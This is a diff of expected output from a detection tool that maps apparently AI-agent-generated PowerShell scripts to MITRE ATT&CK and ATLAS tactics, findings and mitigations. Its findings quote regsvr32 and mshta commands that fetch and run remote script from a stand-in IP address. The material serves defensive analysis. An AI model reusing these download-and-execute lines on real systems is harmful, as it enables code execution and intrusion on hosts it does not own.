@@ -5,7 +5,7 @@ slopmop report   <folder>
 Summary
   files       11  7 scripts, 3 outputs
   indicators  20  5 Domain, 1 EncodedCommand, 3 IPv4, 11 URL
-  activities  11
+  activities  12
   tactics     6
   targeted    4   Hostnames 1, IP addresses 3
   exposed     4   Usernames 1, IP addresses 3
@@ -16,12 +16,12 @@ Tactics   (tactic, identifiers, files)
   [x] Persistence        TA0003, AML.TA0006  20261020_101500_step04_persist.ps1, proc_20261020_103500.jsonl
   [!] Execution          TA0002, AML.TA0005  20261020_101000_step03_exec.ps1, 20261020_101500_step04_persist.ps1, 20261020_102500_step06_pinvoke.ps1 and 1 more
   [!] Stealth            TA0005, AML.TA0007  20261020_101000_step03_exec.ps1, 20261020_101500_step04_persist.ps1, 20261020_102000_step05_dotnet.ps1 and 3 more
-  [i] Discovery          TA0007, AML.TA0008  20261020_100000_step01_recon.ps1, 20261020_102500_step06_pinvoke.ps1
+  [i] Discovery          TA0007, AML.TA0008  20261020_100000_step01_recon.ps1, 20261020_102500_step06_pinvoke.ps1, recon_20261020_100030.txt
 
 Timeline   (a block for each intent, from the first of its files to be created until the last, or for each period of files that show the same tactics; a row is an ATT&CK technique, then its tactic and its ATLAS technique, or the tools of a tactic that no technique is named for)
-  [i] Discovery                                                     2026-10-20T10:00:00Z
+  [i] Discovery                                                     2026-10-20T10:00:00Z to 2026-10-20T10:00:30Z
+      T1087.002  Account Discovery: Domain Account                               TA0007  Discovery            AML.T0075  Enterprise Resource Discovery
       tools      whoami, nltest, net.exe, wmic.exe                               TA0007  Discovery
-      no MITRE ATT&CK technique identified
 
   [x] CommandAndControl                                             2026-10-20T10:05:00Z
       T1105      Ingress Tool Transfer                                           TA0011  CommandAndControl    AML.T0072  Cyber Communication Channel
@@ -82,7 +82,6 @@ Timeline   (a block for each intent, from the first of its files to be created u
       T1685.005  Disable or Modify Tools: Clear Windows Event Logs               TA0112  DefenseImpairment    AML.T0138  Indicator Removal
       tools      wevtutil                                                        TA0112  DefenseImpairment
       T1105      Ingress Tool Transfer                                           TA0011  CommandAndControl    AML.T0072  Cyber Communication Channel
-  and 1 file that shows no tactic, in the saved trace
 
 Findings
   activities
@@ -120,6 +119,8 @@ Findings
               regsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)
               mshta http://203.0.113.10/a.hta (20261020_101000_step03_exec.ps1:3)
               and 6 more in the saved findings
+    [i] DomainAccountDiscovery      1 line   Discovery                     T1087.002, AML.T0075
+        what  corp\svc_build S-1-5-21-1111111111-2222222222-3333333333-1105 (recon_20261020_100030.txt:2)
 
 Targeted   (hardcoded values: prior means no earlier output holds it, discovered means one does; subjects: each entity an activity acted on)
   Hostnames (1)
@@ -264,73 +265,74 @@ Remediation   (most urgent first)
 Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1018 User Account Management                              T1047, T1053.005
       User Account Management involves implementing and enforcing policies for the lifecycle of user accounts, including creation, modification, and deactivation.
-      for  ProcessStart, ScheduledTaskCreation
+      for      ProcessStart, ScheduledTaskCreation
   [x] M1022 Restrict File and Directory Permissions              T1685.005
       Restricting file and directory permissions involves setting access controls at the file system level to limit which users, groups, or processes can read, write, or execute files.
-      for  EventLogClearing
+      for      EventLogClearing
   [x] M1026 Privileged Account Management                        T1047, T1053.005, T1055, T1059, T1059.001, T1218
       Privileged Account Management focuses on implementing policies, controls, and tools to securely manage privileged accounts (e.g., SYSTEM, root, or administrative accounts).
-      for  ProcessStart, ScheduledTaskCreation, NativeApiCall, DownloadAndExecute, SignedBinaryProxyExecution
-  [x] M1028 Operating System Configuration                       T1053.005
+      for      ProcessStart, ScheduledTaskCreation, NativeApiCall, DownloadAndExecute, SignedBinaryProxyExecution
+  [x] M1028 Operating System Configuration                       T1053.005, T1087.002
       Operating System Configuration involves adjusting system settings and hardening the default configurations of an operating system (OS) to mitigate adversary exploitation and prevent abuse of system functionality.
-      for  ScheduledTaskCreation
+      exposed  username: svc_build
+      for      ScheduledTaskCreation, DomainAccountDiscovery
   [x] M1029 Remote Data Storage                                  T1685.005
       Remote Data Storage focuses on moving critical data, such as security logs and sensitive files, to secure, off-host locations to minimize unauthorized access, tampering, or destruction by adversaries.
-      for  EventLogClearing
+      for      EventLogClearing
   [x] M1030 Network Segmentation                                 T1095
       Network segmentation involves dividing a network into smaller, isolated segments to control and limit the flow of traffic between devices, systems, and applications.
-      for  NetworkSocket
+      for      NetworkSocket
   [x] M1031 Network Intrusion Prevention                         T1095, T1105
       Use intrusion detection signatures to block traffic at network boundaries.
-      for  NetworkSocket, FileDownload, DownloadAndExecute
+      for      NetworkSocket, FileDownload, DownloadAndExecute
   [x] M1037 Filter Network Traffic                               T1095, T1105, T1218
       Employ network appliances and endpoint software to filter ingress, egress, and lateral network traffic.
-      for  NetworkSocket, FileDownload, DownloadAndExecute, SignedBinaryProxyExecution
+      for      NetworkSocket, FileDownload, DownloadAndExecute, SignedBinaryProxyExecution
   [x] M1038 Execution Prevention                                 T1047, T1059, T1059.001, T1059.003, T1106, T1127, T1127.001, T1218
       Prevent the execution of unauthorized or malicious code on systems by implementing application control, script blocking, and other execution prevention mechanisms.
-      for  ProcessStart, DownloadAndExecute, NativeApiCall, SignedBinaryProxyExecution
+      for      ProcessStart, DownloadAndExecute, NativeApiCall, SignedBinaryProxyExecution
   [x] M1041 Encrypt Sensitive Information                        T1685.005
       Protect sensitive information at rest, in transit, and during processing by using strong encryption algorithms.
-      for  EventLogClearing
+      for      EventLogClearing
   [x] M1042 Disable or Remove Feature or Program                 T1059, T1059.001, T1127, T1127.001, T1218
       Disable or remove unnecessary and potentially vulnerable software, features, or services to reduce the attack surface and prevent abuse by adversaries.
-      for  ProcessStart, DownloadAndExecute, SignedBinaryProxyExecution
+      for      ProcessStart, DownloadAndExecute, SignedBinaryProxyExecution
   [x] M1045 Code Signing                                         T1059, T1059.001
       Code Signing is a security process that ensures the authenticity and integrity of software by digitally signing executables, scripts, and other code artifacts.
-      for  ProcessStart, DownloadAndExecute
+      for      ProcessStart, DownloadAndExecute
   [x] M1047 Audit                                                T1053.005, T1059, T1095
       Auditing is the process of recording activity and systematically reviewing and analyzing the activity and system configurations.
-      for  ScheduledTaskCreation, ProcessStart, NetworkSocket
+      for      ScheduledTaskCreation, ProcessStart, NetworkSocket
   [x] M1049 Antivirus/Antimalware                                T1059, T1059.001
       Antivirus/Antimalware solutions utilize signatures, heuristics, and behavioral analysis to detect, block, and remediate malicious software, including viruses, trojans, ransomware, and spyware.
-      for  ProcessStart, DownloadAndExecute
+      for      ProcessStart, DownloadAndExecute
   [!] M1021 Restrict Web-Based Content                           T1059, T1127, T1218
       Restricting web-based content involves enforcing policies and technologies that limit access to potentially malicious websites, unsafe downloads, and unauthorized browser behaviors.
-      for  ProcessStart, SignedBinaryProxyExecution
+      for      ProcessStart, SignedBinaryProxyExecution
   [!] M1033 Limit Software Installation                          T1059
       Prevent users or groups from installing unauthorized or unapproved software to reduce the risk of introducing malicious or vulnerable applications.
-      for  ProcessStart
+      for      ProcessStart
   [!] M1040 Behavior Prevention on Endpoint                      T1047, T1055, T1059, T1106
       Behavior Prevention on Endpoint refers to the use of technologies and strategies to detect and block potentially malicious activities by analyzing the behavior of processes, files, API calls, and other endpoint events.
-      for  ProcessStart, NativeApiCall
+      for      ProcessStart, NativeApiCall
   [!] M1050 Exploit Protection                                   T1218
       Deploy capabilities that detect, block, and mitigate conditions indicative of software exploits.
-      for  SignedBinaryProxyExecution
+      for      SignedBinaryProxyExecution
   [x] AML.M0011 Restrict Library Loading                         AML.T0050, AML.T0142
       Prevent abuse of library loading mechanisms in the operating system and software to load untrusted code by configuring appropriate library loading mechanisms and investigating potential vulnerable software.
-      for  DownloadAndExecute, ProcessStart, RunKeyPersistence
+      for      DownloadAndExecute, ProcessStart, RunKeyPersistence
   [x] AML.M0013 Code Signing                                     AML.T0142
       Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.
-      for  RunKeyPersistence
+      for      RunKeyPersistence
   [x] AML.M0043 AI Agent External Resource Lifecycle Management  AML.T0072
       Organizations should control external resources created or acquired by AI agents during execution by treating those resources as attributable, lifecycle-managed assets.
-      for  FileDownload, DownloadAndExecute, NetworkSocket
+      for      FileDownload, DownloadAndExecute, NetworkSocket
   [i] AML.M0020 Generative AI Guardrails                         AML.T0102
       Guardrails are safety controls placed between users, tools, and generative AI models to evaluate prompts, retrieved context, model outputs, and agent actions before they are accepted, executed, or shown to a user.
-      for  Commands generated by an AI agent
+      for      Commands generated by an AI agent
   [i] AML.M0022 Generative AI Model Alignment                    AML.T0102
       Generative AI Model Alignment is the process of training or fine-tuning a generative model to guide its output toward a set of human values, goals, or ethical principles.
-      for  Commands generated by an AI agent
+      for      Commands generated by an AI agent
 
 [x] HIGH - 6 impacts: 3 high, 1 medium, 2 low
 -> saved to <out>: report.txt, report.md, report.html, files.csv, trace.json, intents.csv, findings.json, targeted.json, exposure.csv, report.json
